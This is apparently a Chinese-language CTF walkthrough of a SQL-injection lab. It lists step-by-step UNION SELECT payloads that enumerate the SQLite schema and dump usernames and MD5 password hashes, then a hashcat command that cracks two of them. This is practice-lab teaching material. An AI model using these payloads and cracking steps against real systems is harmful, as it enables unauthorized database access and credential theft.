你受雇于一个神秘渗透测试小组，他们喜欢巧妙的谜题。  
系统看起来平平无奇，但表象会骗人。  
在某个角落，草率的代码和遗留的哈希做法为攻击者留下了一扇微小而完美的门。

你的任务——如果你选择接受——就是溜过那扇门，伪装成合法用户，并获取秘密 flag。  
[在此登录]并找到 flag！

    ```http
    Cookie: PHPSESSID=904fc4e44649782544ddd63f1d4bc9d1
    ```
    - 响应
        ```html
        <h3>Results</h3>
        <ul>
            <li><strong>flag1</strong>: academy{n0T_F0uNd_s3cr3T_K3y_34rd76s1}</li>
            ...
            
        ```
        - 得到一批假 flag
        - 结合挑战名，作为 SQL 类挑战

测试 SQL 注入
- 查询不存在内容
    ```
    q = not exist
    ```
    - 得到
        ```html
        <div class='muted'>
            No flags matched your search.
        </div>
        ```
        - 空匹配提示

- 测试注入布尔为真
    ```sql
    q = 'not exist' or 1=1 --
    ```
    - 得到所有查询，确认 SQL 注入

- 测试原查询列数
    ```sql
    q = 'not exist' or 1=1 order by 2 --
    ```

- 测试原查询列类型
    ```sql
    q = 'not exist' UNION SELECT 'a', 'b' --
    ```
    - 响应
        ```html
        <li>
            <strong>
                a
            </strong>
            : b
        </li>
        ```
        - 作为 flag 名，与 flag 值

- 查询创建表语句
    ```sql
    q = 'not exist' UNION SELECT sql, '' FROM sqlite_master --
    ```
    - 过程中发现 null 导致 php 解析异常
    - 得到

        ```sql
        CREATE TABLE flags (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                key TEXT NOT NULL UNIQUE,
                value TEXT NOT NULL
            )

        CREATE TABLE sqlite_sequence(name,seq)

        CREATE TABLE users (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL UNIQUE,
                password TEXT NOT NULL
            )
        ```

- 查询表 sqlite_sequence
    ```sql
    q = 'not exist' UNION SELECT GROUP_CONCAT(name || ' ' || seq, '$'), '' FROM sqlite_sequence --
    ```
    - 响应
        ```
        users 7$flags 10
        ```

- 查询表 users
    ```sql
    q = 'not exist' UNION SELECT GROUP_CONCAT(username || ' ' || password, '$'), '' FROM users --
    ```
    - 响应格式化后
        ```
        ctf-player 7a67ab5872843b22b5e14511867c4e43
        noaccess 83806b490e28a7f8e6662646cbdbff1a
        suspicious eb1f3ba6901c65d9b2e09a38f560758b
        malicious a669d60c31ad3d05b9e453c8576c7aab
        ghost 8d2379c40704bed972e55680be2355e2
        admin 5a9a79d9fa477ed163b89088681672c9
        wiener 51dc30ddc473d43a6011e9ebba6ca770
        ```
        - 密码似乎使用 md5 hash
            - `wiener` 的 hash 查询[彩虹表得到 `peter`](https://md5.gromweb.com/?md5=51dc30ddc473d43a6011e9ebba6ca770)
            - 然而其他用户的密码无彩虹表对应
        - 使用 hashcat 对这批 md5 测试
            ```sh
            hashcat -a 0 -D 1 -m 0 --show hash.txt rockyou.txt
            ```
            - 得到
                ```log
                7a67ab5872843b22b5e14511867c4e43:dyesebel
                51dc30ddc473d43a6011e9ebba6ca770:peter
                ```
                - 此处仅1个其他用户对应彩虹表
                    - 用户 `ctf-player`，密码 `dyesebel`
